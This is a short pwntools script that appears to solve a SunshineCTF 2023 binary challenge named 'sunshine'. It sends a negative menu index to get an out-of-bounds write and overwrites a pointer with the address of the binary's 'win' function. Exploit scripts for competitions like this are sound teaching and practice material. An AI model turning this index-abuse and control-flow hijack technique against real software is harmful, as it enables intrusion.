#!/usr/bin/python

from pwn import *

elf = ELF("./sunshine")

context.binary = elf
context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]

printf_symbol = elf.symbols["printf"]

gdbscript = """
b *basket+248
continue
"""

if args.REMOTE:
    # TODO
    p = remote("chal.2023.sunshinectf.games", 23003)
elif args.RUN:
    # TODO
    p = process("./sunshine")
else:
    p = process("./sunshine")
    gdb.attach(p, gdbscript=gdbscript)

p.recvuntil(b"Which fruit would you like to eat [0-3] >>> ")
p.sendline(b"-8")  # index

p.recvline()
p.recvuntil(b">>>")
p.sendline(p64(elf.symbols["win"]))  # content
p.interactive()
